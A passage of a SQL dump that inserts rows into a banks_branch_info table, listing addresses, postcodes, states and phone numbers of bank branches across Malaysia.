(620, 11, 3, 'Lot G35, Ground Floor Petronas Twin Tower Kuala Lumpur City Centre Jalan Ampang ', 'Kuala Lumpur ', '50088 ', 'Kuala Lumpur', '1 300 880 900', NULL, NULL, NULL, NULL),
(621, 11, 3, 'Lot 112 1st Floor Podium Block Kompleks Dayabumi  Jalan Sultan Hishamuddin', 'Kuala Lumpur ', ' 50050 ', 'Kuala Lumpur ', '1 300 880 900', NULL, NULL, NULL, NULL),
(622, 11, 3, '21 Lorong Ara Kiri Satu  Lucky Garden ', 'Bangsar ', ' 59100 ', 'Kuala Lumpur ', '1 300 880 900', NULL, NULL, NULL, NULL),
(623, 11, 3, '205 Jalan Bunus  off Jalan Masjid India ', 'Kuala Lumpur  ', '50100 ', 'Kuala Lumpur  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(624, 11, 3, 'Lot G (E) - 006 & 007  Megamall Mid-Valley City  Batu 2 1/2 Jalan Klang Lama ', 'Kuala Lumpur ', '58000 ', 'Kuala Lumpur  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(625, 11, 3, '(Private Banking Virtual Branch) Lot 7-01, Level 9 Menara Millennium  8 Jalan Damanlela ', 'Bukit Damansara ', ' 50490 ', 'Kuala Lumpur  ', '603 - 2087 8688', NULL, NULL, NULL, NULL),
(626, 11, 3, '1st Floor Menara PNB  Jalan Tun Razak ', ' Kuala Lumpur  ', '50400', ' Kuala Lumpur  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(627, 11, 3, '21G Jalan Pandan Indah 4/34 Pandan Indah ', ' Kuala Lumpur', '55100', ' Kuala Lumpur', '1 300 880 900', NULL, NULL, NULL, NULL),
(628, 11, 3, '43 Jalan Pandan 3/3 Pandan Jaya ', 'Kuala Lumpur ', '55100 ', 'Kuala Lumpur  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(629, 11, 3, 'Lot 1.0.1. Pearl Point Shopping Mall  Batu Lima off Jalan Klang Lama ', 'Kuala Lumpur  ', '58000 ', 'Kuala Lumpur  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(630, 11, 3, 'Menara Southern Bank 83 Medan Setia 1 Plaza Damansara ', 'Bukit Damansara ', '50490 ', 'Kuala Lumpur ', ' 1 300 880 900', NULL, NULL, NULL, NULL),
(631, 11, 3, 'Level 2 Podium Block  Pusat Dagangan Dunia Putra Jalan Tun Ismail ', ' Kuala Lumpur', '50480', ' Kuala Lumpur  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(632, 11, 3, '151 Jalan 2/3A  off 12 km Jalan Ipoh', ' Batu Caves', ' 68100', ' Kuala Lumpur ', '1 300 880 900', NULL, NULL, NULL, NULL),
(633, 11, 3, '2 The Boulevard Shop Office Jalan 11/48A  ', ' Sentul Raya', '51000', ' Kuala Lumpur', ' 1 300 880 900', NULL, NULL, NULL, NULL),
(634, 11, 3, '15 Jalan Solaris Solaris Mont'' Kiara ', ' Kuala Lumpur  ', '50480', ' Kuala Lumpur  ', '603 6203 7743/45/46/49/51', NULL, NULL, NULL, NULL),
(635, 11, 3, 'T1 Relish Floor Starhill Gallery  181 Jalan Bukit Bintang ', 'Kuala Lumpur  ', '55100 ', 'Kuala Lumpur ', '603 - 2145 2576', NULL, NULL, NULL, NULL),
(636, 11, 3, '2 Jalan Kaskas Taman Cheras  ', ' Cheras ', '56100', 'Kuala Lumpur  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(637, 11, 3, '76 Jalan Cheras  Taman Connaught  ', 'Cheras', '56000 ', ' Kuala Lumpur  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(638, 11, 3, '108 Jalan 2/23A Taman Danau Kota Jalan Genting Klang  ', 'Setapak ', '53300 ', 'Kuala Lumpur ', '1 300 880 900', NULL, NULL, NULL, NULL),
(639, 11, 3, 'Ground & 1st Floor,  No 279 & 279A, Jalan Perkasa 1 Taman Maluri off Jalan Cheras ', 'Kuala Lumpur  ', '55100 ', 'Kuala Lumpur  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(640, 11, 3, '227 Jalan Bandar 13 Taman Melawati', 'Kuala Lumpur ', ' 53100 ', 'Kuala Lumpur ', ' 1 300 880 900', NULL, NULL, NULL, NULL),
(641, 11, 3, '2468 Jalan Mutiara Timur Satu  Taman Mutiara  ', 'Cheras', '56100 ', ' Kuala Lumpur  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(642, 11, 3, '1 Jalan 9A/55A Taman Setiawangsa ', ' Kuala Lumpur ', '54200', ' Kuala Lumpur  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(643, 11, 3, '21 & 23, Jalan 46A/26  Taman Sri Rampai', 'Setapak', ' 53300 ', ' Kuala Lumpur  ', '1 300 880 900', NULL, NULL, NULL, NULL),
(644, 11, 3, '138 Jalan Burhannuddin Helmi  Taman Tun Dr. Ismail', 'Kuala Lumpur', ' 60000 ', 'Kuala Lumpur ', ' 1 300 880 900', NULL, NULL, NULL, NULL),
(645, 11, 3, 'Lot 5270 Bangunan Pentadbiran Baru Universiti Malaya ', 'Lembah Pantai ', '59100 ', 'Kuala Lumpur ', ' 1 300 880 900', NULL, NULL, NULL, NULL),
(646, 11, 3, 'Ground Floor Wisma Genting 28 Jalan Sultan Ismail ', ' Kuala Lumpur', '50250', ' Kuala Lumpur ', '1 300 880 900', NULL, NULL, NULL, NULL),
(647, 11, 3, '498-0-1 Wisma Indah  Jalan Tun Razak ', ' Kuala Lumpur  ', '50400', ' Kuala Lumpur ', ' 1 300 880 900', NULL, NULL, NULL, NULL),
(648, 11, 3, '6 Medan Mewah ', 'Bandar Muadzam Shah ', '26700 ', 'Pahang ', ' 609 - 452 2077', NULL, NULL, NULL, NULL),
(649, 11, 3, '87 Jalan Loke Yew ', 'Bentong ', '28700 ', 'Pahang', '609 - 222 2966', NULL, NULL, NULL, NULL),
(650, 11, 3, 'Lot G/G 3.00 Genting Hotel Genting Highlands Resort ', 'Pahang', '69000 ', 'Pahang ', '  603 - 6101 1166', NULL, NULL, NULL, NULL),
(651, 11, 3, 'Bangunan CIMB Lot 32 Jalan Bank ', 'Kuantan', '25050 ', ' Pahang ', '609 - 516 2099', NULL, NULL, NULL, NULL),
(652, 11, 3, 'B-338 Jalan Beserah', 'Kuantan', ' 25300 ', ' Pahang', '609 - 566 3387', NULL, NULL, NULL, NULL),
(653, 11, 3, 'No A1 Lorong Tun Ismail 9 Sri Dagangan 2 ', 'Kuantan ', '25000 ', 'Pahang ', '609 - 516 2855', NULL, NULL, NULL, NULL),
(654, 11, 3, '23 Jalan Tahan', ' Jerantut ', ' 27000', 'Pahang ', '609 - 266 2250', NULL, NULL, NULL, NULL),
(655, 11, 3, 'No. 10 Jalan Corina 1 Taman Desa Corina Kampung Raja ', 'Cameron Highlands ', '39010 ', 'Pahang ', ' 605 - 498 3303', NULL, NULL, NULL, NULL),
(656, 11, 3, ' Kompleks Teruntum Lot G-01 Kompleks Teruntum Jalan Penjara ', 'Kuantan ', '25000 ', 'Pahang', ' 609 - 512 1347', NULL, NULL, NULL, NULL),
(657, 11, 3, ' 17 Bangunan LKNP Jalan Besar ', 'Kuala Lipis ', '27200 ', 'Pahang', ' 609 - 312 1907', NULL, NULL, NULL, NULL),
(658, 11, 3, '47 Bangunan LKNP ', 'Maran ', '26500 ', 'Pahang', '609 - 477 7007', NULL, NULL, NULL, NULL),
(659, 11, 3, '46 Jalan Temerloh ', 'Mentakab', '28400 ', ' Pahang  ', '609 - 277 7973', NULL, NULL, NULL, NULL),
(660, 11, 3, 'Lot 83 Jalan Sultan Abdullah ', ' Pekan ', '26600', 'Pahang', ' 609 - 422 2024', NULL, NULL, NULL, NULL),
(661, 11, 3, '33 Jalan Lipis Bandar Raub Perdana ', 'Raub ', '27600 ', 'Pahang ', '609 - 355 9387', NULL, NULL, NULL, NULL),
(662, 11, 3, 'No 22 Main Road Ringlet ', 'Cameron Highlands ', '39200 ', 'Pahang', '609 - 495 6877', NULL, NULL, NULL, NULL),
(663, 11, 3, 'No. 48 Jalan Dagangan 7 Pusat Dagangan Triang ', ' Triang ', '28300', 'Pahang', '609 - 255 6030', NULL, NULL, NULL, NULL),
(664, 11, 3, 'Lot PT 8360 Taman Wangsa Mewangi ', 'Gua Musang ', '18300 ', 'Kelantan', '609 - 912 1424', NULL, NULL, NULL, NULL),
(665, 11, 3, 'Bangunan BCB Jalan Maju ', ' Kota Bharu ', '15000', 'Kelantan', '  609 - 741 9033', NULL, NULL, NULL, NULL),
(666, 11, 3, 'Lot 1361 Jalan Besar Guchil Baru ', 'Kuala Krai ', '18000 ', 'Kelantan ', '609 - 966 7142', NULL, NULL, NULL, NULL),
(667, 11, 3, 'Jalan Raja Perempuan Zainab 2 Bandar Baru Kubang Kerian ', 'Kota Bahru ', '16150 ', 'Kelantan ', '609 - 7649 990', NULL, NULL, NULL, NULL),
(668, 11, 3, 'Lot 261 Jalan Masjid  ', ' Machang ', '18500', 'Kelantan ', '609 - 975 7380', NULL, NULL, NULL, NULL),
(669, 11, 3, '110 Serakai Mas Plaza ', ' Pasir Mas ', '17000', 'Kelantan', ' 609 - 790 0090', NULL, NULL, NULL, NULL),
(670, 11, 3, 'Lot 422 Jalan Pasir Puteh', 'Pasir Puteh ', ' 16800 ', 'Kelantan', '609 - 786 4367', NULL, NULL, NULL, NULL),
(671, 11, 3, 'Lot 522 Jalan Dato'' Nik Mustapha ', ' Tanah Merah', '17500', ' Kelantan', '609 - 955 6084', NULL, NULL, NULL, NULL),
(672, 11, 3, 'Lot 10  Pasar Awam Bersepadu Wakaf Che Yeh Jalan Kuala Krai ', 'Kota Bharu ', '15100 ', 'Kelantan  ', '609 - 7430 6411', NULL, NULL, NULL, NULL),
(673, 11, 3, 'Lot 1  Jalan Pengkalan Chepa Wisma Square Point', 'Kota Bharu', ' 15400 ', ' Kelantan', '609 - 741 9009', NULL, NULL, NULL, NULL),
(674, 11, 3, 'Lot K15 Pusat Bandar Bandar Al-Muktafibillah Shah ', 'Dungun ', '23400 ', 'Terengganu', ' 609 - 822 3332', NULL, NULL, NULL, NULL),
(675, 11, 3, 'Lot PT 3421 & 3422  Jalan Permaisuri 2 ', 'Setiu ', '22110 ', 'Terengganu', '609 - 609 2301', NULL, NULL, NULL, NULL),
(676, 11, 3, '3679 Bangunan UMNO Jalan Besar ', 'Dungun ', '23000 ', 'Terengganu', '609 - 848 1555', NULL, NULL, NULL, NULL),
(677, 11, 3, '104 A-B Jalan Sultan Ismail ', ' Kuala Terengganu ', '20200', 'Terengganu  ', '609 - 625 1815', NULL, NULL, NULL, NULL),
(678, 11, 3, 'Bangunan UMNO  (Baitul Ehsan) Jalan Besar ', ' Jerteh ', '22000', 'Terengganu ', ' 609 -697 1135', NULL, NULL, NULL, NULL),
(679, 11, 3, 'Lot 11 Ground Floor Mesra Mall ', 'Kerteh ', '24200 ', 'Terengganu', '  609-864 2340', NULL, NULL, NULL, NULL),
(680, 11, 3, 'No 24 KT Business Centre Padang Hiliran ', ' Kuala Terengganu ', '21572', 'Terengganu', '609 - 631 5526', NULL, NULL, NULL, NULL),
(681, 11, 3, 'PT 11286 & 11287  Jalan Kubang Kurus Taman Cukai Utama', 'Kemaman ', ' 24000 ', 'Terengganu ', ' 609 - 858 9220', NULL, NULL, NULL, NULL),
(682, 12, 3, '26 & 27, Lorong Setia Satu, Air Keroh Heights, ', 'Melaka   ', '75450 ', 'Melaka', '06-2327208 , 06-2327209', NULL, NULL, NULL, NULL),
(683, 12, 3, '60-68, Jalan Laksamana,  ', ' Melaka', '75000', ' Melaka ', '06-2830233', NULL, NULL, NULL, NULL),
(684, 12, 3, '300, 300A, 300B & 300-1, Jalan Ong Kim Wee,  ', ' Melaka', '75300', ' Melaka ', ' 06-2832052, 06-2832054, 06-2832072', NULL, NULL, NULL, NULL),
(685, 12, 3, 'No. 1, 3 & 5,  Jalan Mutiara Melaka 4, Taman Mutiara Melaka, Batu Berendam,', 'Melaka ', ' 75350 ', 'Melaka', '06-317 6200, 06-317 6204, 06-317 6205, 06-317 8217', NULL, NULL, NULL, NULL),
(686, 12, 3, '6 & 8, Jalan Suria 2, Taman Malim Jaya,  ', 'Melaka ', '75250 ', 'Melaka ', '06-3346397 , 06-3346404', NULL, NULL, NULL, NULL),
(687, 12, 3, 'Lot 367 & 368, Kompleks Perniagaan,  ', 'Masjid Tanah,  ', '78300 ', 'Melaka ', '06-3847712 , 06-3847713', NULL, NULL, NULL, NULL),
(688, 12, 3, '566, 567 & 568, Jalan Merdeka, Taman Melaka Raya,  ', 'Melaka', '75000 ', 'Melaka', ' 06-2817527 , 06-2817528 ', NULL, NULL, NULL, NULL),
(689, 12, 3, '120 & 121, Jalan Gurney, ', 'Bahau, ', '72100 ', ' Negeri Sembilan ', '06-4544102, 06-4544103', NULL, NULL, NULL, NULL),
(690, 12, 3, '128A & 128B, Jalan Syed Ali, ', 'Kuala Kelawang, Jelebu,  ', '71600 ', 'Negeri Sembilan  ', '06-6136925, 06-6136926', NULL, NULL, NULL, NULL),
(691, 12, 3, '1281-1284, Jalan Rasah, ', 'Seremban,  ', '70300 ', 'Negeri Sembilan', ' 06-7620623, 06-7625544, 067628289', NULL, NULL, NULL, NULL),
(692, 12, 3, '12, Jalan Mahkamah,  ', 'Gemas,  ', '73400 ', 'Negeri Sembilan ', '07-9481770, 07-9481780', NULL, NULL, NULL, NULL),
(693, 12, 3, '168 - 170, Jalan Besar, ', ' Nilai, ', '71800', ' Negeri Sembilan  ', ' 06-7991066, 06-7991067', NULL, NULL, NULL, NULL),
(694, 12, 3, '44-46, Jalan Dato'' Lee Fong Yee,  ', 'Seremban,  ', '70000 ', 'Negeri Sembilan', '06-7630661, 06-7630662', NULL, NULL, NULL, NULL),
(695, 12, 3, '564, Jalan Perpateh', 'Kuala Pilah ', ' 72000 ', 'Negeri Sembilan ', ' 06-4812 277/99', NULL, NULL, NULL, NULL),
(696, 12, 3, '866 & 867, Jalan Pantai, ', 'Port Dickson,  ', '71000 ', 'Negeri Sembilan', ' 06-6472942, 06-6472943', NULL, NULL, NULL, NULL),
(697, 12, 3, '4707 & 4708, Jalan Besar', 'Tampin,  ', ' 73000 ', 'Negeri Sembilan', ' 06-441 2511, 06-441 2512', NULL, NULL, NULL, NULL),
(698, 12, 3, '17 & 19, Jalan Permas 10/1,  Bandar Baru Permas Jaya, ', 'Masai,  ', '81750 ', 'Johor   ', '07-3883252, 07-3883253, 07-3883254', NULL, NULL, NULL, NULL),
(699, 12, 3, '116, 117 & 118,  Jalan Chengal, Taman Makmur, ', 'Batu Pahat,  ', '83000 ', 'Johor', '07-4344941 , 07-4344942', NULL, NULL, NULL, NULL),
(700, 12, 3, '36-2 & 36-3,  Taman Bahagia, Jalan Panchor,  Bukit Pasir,  ', 'Muar, ', '84300 ', ' Johor ', ' 06-9857261, 06-9856878', NULL, NULL, NULL, NULL),
(701, 12, 3, '3 & 5, Jalan Yong Peng, ', 'Chaah,  ', ' 85400 ', 'Johor ', ' 07-9262001 , 07-9262002', NULL, NULL, NULL, NULL),
(702, 12, 3, '811 & 812, Jalan Aman, Taman Bahagia,  ', ' Endau,  ', '86900', 'Johor ', ' 07-7944051 , 07-7944155', NULL, NULL, NULL, NULL),
(703, 12, 3, '74 & 76, Jalan Abdullah, ', ' Muar,  ', '84000', 'Johor', '06-951 8753/60', NULL, NULL, NULL, NULL),
(704, 12, 3, 'Level 1 & 12, Public Bank Tower,  19, Jalan Wong Ah Fook,  ', 'Johor Bahru,  ', '80000 ', 'Johor  ', ' 07-218 6888', NULL, NULL, NULL, NULL),
(705, 12, 3, '12, Jalan Parang 1, Taman Sri Kahang,  ', ' Kahang,', '86700', '  Johor ', '07-7882294, 07-7882295', NULL, NULL, NULL, NULL),
(706, 12, 3, '3A, 3B & 3C, Jalan Dato'' Teoh Siew Khor,', ' Kluang,  ', ' 86000', 'Johor ', '07-7735112/113, 07-7727643/689,  07-7712185', NULL, NULL, NULL, NULL),
(707, 12, 3, '10A, 10B & 10C, Jalan Tun Habab,  ', 'Kota Tinggi,  ', '81900 ', 'Johor', '07-8834 174, 07-8834 192, 07-8834 195, 07-8834 687 & 07-8834 835 ', NULL, NULL, NULL, NULL),
(708, 12, 3, '42-1, 42-2 & 42-3, Jalan Raya, Kulai Besar, ', 'Kulai, ', '81000 ', ' Johor', ' 07-6634166 , 07-6634167', NULL, NULL, NULL, NULL),
(709, 12, 3, '1 & 3, Jalan Suria 3 Bandar Seri Alam,  ', 'Masai,  ', '81750 ', 'Johor ', '07-2522498 , 07-2522500', NULL, NULL, NULL, NULL),
(710, 12, 3, '21 & 22, Jalan Sulaiman, ', 'Mersing,  ', '86800 ', 'Johor ', '07-7992695 , 07-7992697', NULL, NULL, NULL, NULL),
(711, 12, 3, '47, 48, 49 & 50, Jalan Sayang ,  ', 'Muar, ', '84000 ', 'Johor ', '06-9517505 , 06-9517520', NULL, NULL, NULL, NULL),
(712, 12, 3, '11 & 12, Jalan Kristal, Taman Kristal 2, ', 'Parit Raja, Batu Pahat,  ', '86400 ', 'Johor  ', '07-4542855, 07-4542857, 07-4542859', NULL, NULL, NULL, NULL),
(713, 12, 3, 'SH9 & SH10, Main Road, ', ' Pekan Nenas,  ', '81500', 'Johor   ', '07-6995352 , 07-6995594', NULL, NULL, NULL, NULL),
(714, 12, 3, '761 & 762, Jalan Taib, ', ' Pontian, ', '82000', ' Johor ', ' 07-6879601 , 07-6879602', NULL, NULL, NULL, NULL),
(715, 12, 3, '62H & 62I, Jalan Genuang,  ', 'Segamat,  ', '85000 ', 'Johor  ', '07-9313900 , 07-9313930', NULL, NULL, NULL, NULL),
(716, 12, 3, '17 & 19, Jalan Bintang Ria 1, Taman Bintang Ria,  ', 'Simpang Renggam, ', '86200 ', ' Johor', '07-7550510, 7550511 & 7550512', NULL, NULL, NULL, NULL),
(717, 12, 3, '2 & 4, Jalan Nakhoda 12, Taman Ungku Tun Aminah, ', ' Skudai, ', '81300', 'Johor  ', '07-557 0007 ,07-557 0008', NULL, NULL, NULL, NULL),
(718, 12, 3, '125, Jalan Muar ', ' Tangkak, ', '84900', 'Johor ', '06-9782 123/4', NULL, NULL, NULL, NULL),
(719, 12, 3, '2, 4 & 6, Jalan Johar 2, Taman Desa Cemerlang, ', 'Ulu Tiram, ', '81800 ', 'Johor ', '07-8616450', NULL, NULL, NULL, NULL);
INSERT INTO `banks_branch_info` (`bbi_id`, `ba_id`, `co_id`, `bbi_address`, `bbi_city`, `bbi_zipcode`, `bbi_state`, `bbi_phone`, `bbi_digitrouting`, `bbi_swiftcode`, `bbi_addinfo`, `bbi_status`) VALUES
(720, 12, 3, '29, 31, 33 & 35, Jalan Rosmerah 2/10, Taman Johor Jaya, ', ' Johor Bahru,  ', ' 81100', 'Johor ', ' 07-354 6755 (Deposit), 07-355 0095(Loans)', NULL, NULL, NULL, NULL),
(721, 12, 3, '48 & 50, Jalan Dian 8, Taman Munsyi Ibrahim, ', ' Johor Bahru,', '81200', ' Johor  ', '07-2346820 , 07-2346821', NULL, NULL, NULL, NULL),
(722, 12, 3, '31,33 & 35, Jalan Persisiran Perling, Taman Perling, ', 'Johor Bahru,  ', ' 81200 ', 'Johor  ', '07-2344919 , 07-2344608', NULL, NULL, NULL, NULL),
(723, 12, 3, 'G1 & G2,Wisma Daiman, 64 Jalan Sulam, Taman Sentosa,  ', 'Johor Bahru, ', '80150 ', ' Johor  ', ' 07-3316521, 07-3312266', NULL, NULL, NULL, NULL),
(724, 12, 3, '14 & 16, Jalan Sri Bahagia 10, Taman Sri Bahagia, Off Jalan Tampoi,', ' Johor Bahru,  ', '  81200', 'Johor ', '07-2377184 , 07-2377519', NULL, NULL, NULL, NULL),
(725, 12, 3, '8 & 9, Jalan Raya, Taman Tiram Baru,  ', 'Ulu Tiram,', '81800 ', '  Johor  ', '07-8613291 , 07-8613292', NULL, NULL, NULL, NULL),
(726, 12, 3, 'Lot 6 & 7 Lo Chung Park ', 'Beaufort  ', ' 89808 ', 'Sabah ', ' 087-214 844 / 869', NULL, NULL, NULL, NULL),
(727, 12, 3, 'Lot A-5 & A-6 Donggongon New Township Jalan Tapikong  ', 'Penampang ', '89500 ', ' Sabah', '088-722 780/ 088-723 780', NULL, NULL, NULL, NULL),
(728, 12, 3, 'Lot No. 1 2 & 3 Block C K.K. Taipan  Inanam New Township Jalan Tuaran ', 'Kota Kinabalu ', ' 88450 ', ' Sabah  ', '088-429 112 / 113 ', NULL, NULL, NULL, NULL),
(729, 12, 3, '1 & 2 Block A Keningau Plaza ', 'Keningau ', '89000 ', 'Sabah  ', '087-335 841 / 846 ', NULL, NULL, NULL, NULL),
(730, 12, 3, 'Lot B6 & B7 Kompleks Centenary Jalan Sabar', ' Kota Belud  ', ' 89150', 'Sabah ', ' 088-977 784 / 807', NULL, NULL, NULL, NULL),
(731, 12, 3, ' 39 Jalan Pantai ', 'Kota Kinabalu ', '88000 ', 'Sabah    ', '  088-236 800', NULL, NULL, NULL, NULL),
(732, 12, 3, ' Lot No. 1-0-M45-M51 1 Jalan Centre Point City Parade Centre Point Sabah ', 'Kota Kinabalu', '88000 ', ' Sabah ', '088-251 812 / 813', NULL, NULL, NULL, NULL),
(733, 12, 3, 'Lot G.1 & Lot 1.1  Menara MAA  6 Lorong Api-Api 1 Api-Api Centre ', 'Kota Kinabalu  ', ' 88000 ', 'Sabah', '088-239 611 / 612', NULL, NULL, NULL, NULL),
(734, 12, 3, 'Lot 8 9 & 10 Block P Taman Che Mei  KM 5 Jalan Penampang Lido ', ' Kota Kinabalu ', ' 88300', ' Sabah   ', '088-245 687 / 088-217 125', NULL, NULL, NULL, NULL),
(735, 12, 3, 'MDLD 0088 Jalan Teratai ', 'Lahad Datu', '91100 ', '  Sabah  ', '089-884 020 / 021', NULL, NULL, NULL, NULL),
(736, 12, 3, 'Lot 8023 162 Jalan Besar Pekan Papar  ', 'Papar  ', '89600 ', 'Sabah ', '088-912 522 / 523', NULL, NULL, NULL, NULL),
(737, 12, 3, '9 & 10 Putatan Town Phase I Jalan Putatan Putatan ', 'Kota Kinabalu ', '88300 ', 'Sabah   Tel:  ', ' 088-771 811', NULL, NULL, NULL, NULL),
(738, 12, 3, ' Lots 149, 150, 151 & 152 Block 15A  Phase II Prima Square Mile 4 Jalan Utara ', 'Sandakan  ', '90000 ', 'Sabah', '089-202 288', NULL, NULL, NULL, NULL),
(739, 12, 3, 'Wisma Sandaraya Third Avenue  ', 'Sandakan  ', '90000 ', 'Sabah', '089-214 257 / 258', NULL, NULL, NULL, NULL),
(740, 12, 3, 'TB 304A & 304B  Block 34  Fajar Complex  ', ' Tawau ', '91000', ' Sabah  ', ' 089-761 311 / 322', NULL, NULL, NULL, NULL),
(741, 12, 3, 'TB1280 & TB1281 Bintang Garden Mile 3 Jalan Apas ', 'Tawau', '91000 ', ' Sabah', ' 089-913 262', NULL, NULL, NULL, NULL),
(742, 12, 3, '9, Jalan Raja Syed Alwi P.O. Box 43,  ', 'Kangar,  ', '01000 ', 'Perlis ', '04-976 3311, 04-976 3432', NULL, NULL, NULL, NULL),
(743, 12, 3, '1070 & 1071, Jalan Telok Wanjah  ', 'Alor Setar,  ', '05200 ', 'Kedah', '04-7315411 , 04-7315412', NULL, NULL, NULL, NULL),
(744, 12, 3, '73, Jalan Sintok, Pekan Baru,  ', 'Changlun, ', '06010 ', 'Kedah  ', ' 04-9241457 , 04-9241085', NULL, NULL, NULL, NULL),
(745, 12, 3, '39 - 41, Jalan Raya, ', 'Gurun,  ', ' 08300 ', 'Kedah  ', '04-4686143 , 04-4686325', NULL, NULL, NULL, NULL),
(746, 12, 3, '1557, Jalan Kota', ' Alor Setar,  ', ' 05000', 'Kedah  ', '04-7310559, 04-7311384', NULL, NULL, NULL, NULL),
(747, 12, 3, '9 & 10, Kompleks Jitra, ', 'Jitra, ', '06000 ', ' Kedah ', '04-9174 926/27', NULL, NULL, NULL, NULL),
(748, 12, 3, '45 & 46, Jalan Putra, Taman Tanjung Peteri,  ', ' Kuala Ketil,  ', '09300', 'Kedah ', ' 04-4163318 , 04-4163278', NULL, NULL, NULL, NULL),
(749, 12, 3, '2, Jalan Tunku Putra, ', ' Kulim,  ', '09000', 'Kedah ', '04-490 1090, 04-490 1096', NULL, NULL, NULL, NULL),
(750, 12, 3, 'A-01, Jalan Semarak 1, Taman Bandar Baru,  ', 'Pokok Sena,  ', '06400 ', ' Kedah  ', '04-7822000 , 04-7822008', NULL, NULL, NULL, NULL),
(751, 12, 3, '23, 25 & 27, Jalan Pandak Mayah 4, Pusat Bandar Kuah, ', 'Pulau Langkawi,', ' 07000 ', '  Kedah  ', '04-9667372 , 04-9667373', NULL, NULL, NULL, NULL),
(752, 12, 3, '443 & 444, Jalan Tunku Ibrahim,  ', 'Sik, ', '08200 ', ' Kedah', ' 04-4695691 , 04-4695764', NULL, NULL, NULL, NULL),
(753, 12, 3, '83A-D, 84A-D & 85A-D,  Jalan Pengkalan, Susur Kiri,  Taman Pekan Baru, ', ' Sungai Petani,', ' 08000', '  Kedah ', '04-4217622, 04-4217623, 04-4217624', NULL, NULL, NULL, NULL),
(754, 12, 3, '139 & 141, Jalan Besar,  ', ' Ayer Tawar, ', '32400', ' Perak ', '05-672 6399 , 05-672 6400', NULL, NULL, NULL, NULL),
(755, 12, 3, '4, 6, 8, & 10,  Persiaran Bercham Selatan 2, ', ' Ipoh,', '31400', '  Perak  ', '05-548 0058, 05-548 0632', NULL, NULL, NULL, NULL),
(756, 12, 3, '133, 133A-D,  Jalan Dato` Lau Pak Khuan, ', 'Ipoh,', ' 31400 ', '  Perak', '05-5480951 , 05-5480952', NULL, NULL, NULL, NULL),
(757, 12, 3, '76, Jalan Sultan Idris Shah, ', ' Ipoh,  ', '30000', 'Perak ', ' 05-2551068 , 05-2551069', NULL, NULL, NULL, NULL),
(758, 12, 3, '3 & 4 Jalan Balai', 'Kampar,', ' 31900 ', '  Perak', '05-4651 044, 05-4652 160', NULL, NULL, NULL, NULL),
(759, 12, 3, '67-73, Jalan Besar, ', ' Menglembu,  ', '31450', 'Perak  ', ' 05-2811014 , 05-2814978', NULL, NULL, NULL, NULL),
(760, 12, 3, '293, Jalan Besar,', 'Pusing,  ', ' 31550 ', 'Perak  ', ' 05-2884077, 05-2884078, 05-2883942', NULL, NULL, NULL, NULL),
(761, 12, 3, 'Lot 166-168, Jalan Raja Omar, ', ' Sitiawan, ', '32000', ' Perak', '05-6913526, 05-6913527', NULL, NULL, NULL, NULL),
(762, 12, 3, 'Lot 336-337, Jalan Chong Ah Peng,  ', ' Tanjong Malim,  ', '35900', 'Perak ', '05-4597602 , 05-4597603', NULL, NULL, NULL, NULL),
(763, 12, 3, '244 & 244A, Jalan Besar', 'Bagan Serai, ', ' 34300 ', ' Perak', ' 05-721 2842, 05-721 2843', NULL, NULL, NULL, NULL),
(764, 12, 3, '12-16, Laluan Chemor Sinaran,  Desa Chemor Sinaran,  ', ' Chemor,  ', '31200', 'Perak ', '05-2011124 , 05-2011125', NULL, NULL, NULL, NULL),
(765, 12, 3, '7 - 13, Jalan Dato Maharajalela,  ', ' Ipoh, ', '30000', 'Perak', '05-2530115 , 05-2531034', NULL, NULL, NULL, NULL),
(766, 12, 3, '46-54, Jalan Yang Kalsom  ', ' Ipoh, ', '30250', ' Perak ', '05-2531998 , 05-2531514', NULL, NULL, NULL, NULL),
(767, 12, 3, '27-29, Regat Kamunting, Off Jalan Kamunting,', ' Kamunting,  ', ' 34600', 'Perak ', '05-8081110 , 05-8081112', NULL, NULL, NULL, NULL),
(768, 12, 3, '135 & 137 Jalan Taiping', 'Parit Buntar, ', ' 34200 ', ' Perak ', '05-7160 078/ 9/80', NULL, NULL, NULL, NULL),
(769, 12, 3, 'Lot No. 2274 - 2277, Taman Samudera, ', 'Seri Manjung, ', ' 32040 ', ' Perak  ', '05-6882927 , 05-6882987', NULL, NULL, NULL, NULL),
(770, 12, 3, '161 & 162, Jalan Besar,  ', ' Sungai Siput, ', '31100', 'Perak ', '05-5986116 , 05-5984114', NULL, NULL, NULL, NULL),
(771, 12, 3, '12 & 14, Jalan Piandang 1, Taman Piandang Indah, ', 'Tanjong Piandang, ', '34250 ', ' Perak ', '05-7257941, 05-7257942', NULL, NULL, NULL, NULL),
(772, 12, 3, '62D - 62E, Jalan Besar, ', 'Bidor, ', '35500 ', ' Perak ', '05-434 1257 & 05-434 0964', NULL, NULL, NULL, NULL),
(773, 12, 3, '296 & 298 Jalan Raja Dr. Nazrin Shah Gunung Rapat', ' Ipoh, ', ' 31350', ' Perak  ', '05-3131 646, 05-3131 649', NULL, NULL, NULL, NULL),
(774, 12, 3, '137 & 139, Jalan Pengkalan Barat, Off Jalan Pasir Putih  ', 'Ipoh, ', '31650 ', ' Perak ', '05-3222453 , 05-3219892', NULL, NULL, NULL, NULL),
(775, 12, 3, '291, 293 & 295, Jalan Silibin,  ', ' Ipoh, ', '30100', ' Perak', ' 05-5264014 , 05-5264015', NULL, NULL, NULL, NULL),
(776, 12, 3, '12, Jalan Daeng Selili,', 'Kuala Kangsar,  ', ' 33000 ', 'Perak', ' 05-7701006 ', NULL, NULL, NULL, NULL),
(777, 12, 3, '66 - 70, Jalan Damar Laut, ', 'Pantai Remis, ', '34900 ', ' Perak  ', '05-6771251 , 05-6771252', NULL, NULL, NULL, NULL),
(778, 12, 3, '39 & 41, Persiaran Sengat Baru 2, Taman Bersatu, ', 'Simpang Pulai, ', ' 31300 ', ' Perak ', '05-3575360 , 05-3575361', NULL, NULL, NULL, NULL),
(779, 12, 3, '29-35, Jalan Kota', 'Taiping,', ' 34000 ', '  Perak', '05-807 2551, 05-808 4291', NULL, NULL, NULL, NULL),
